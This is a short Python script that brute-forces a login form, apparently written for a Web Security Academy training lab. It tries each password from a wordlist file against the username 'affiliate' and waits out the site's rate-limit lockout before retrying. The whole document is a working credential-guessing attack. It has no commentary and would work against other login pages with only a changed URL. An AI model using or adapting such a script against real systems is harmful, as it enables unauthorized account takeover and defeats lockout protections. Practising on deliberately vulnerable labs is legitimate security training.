with open('password.txt', 'r') as f:
    password = f.readlines()
    
URL = 'https://0a8800320456b4a7802c5315008500c7.web-security-academy.net/login'


import requests
import time

rate_limit_msg = "You have made too many incorrect login attempts. Please try again in 1 minute(s)."

for pwd in password:
    pwd = pwd.strip()
    while True:
        print(f"[*] Trying: {pwd}")

        try:
            response = requests.post(URL, data={'username': 'affiliate', 'password': pwd})
            response.raise_for_status()

            if "Log in" not in response.text:
                print(f"[+] Found password: {pwd}")
                exit()

            if rate_limit_msg in response.text:
                print("[*] Rate limit hit. Waiting for 60 seconds before retrying...")
                time.sleep(60)
                continue

            break
        except requests.RequestException as e:
            print(f"[!] Error: {e}. Retrying in 5 seconds...")
            time.sleep(5)
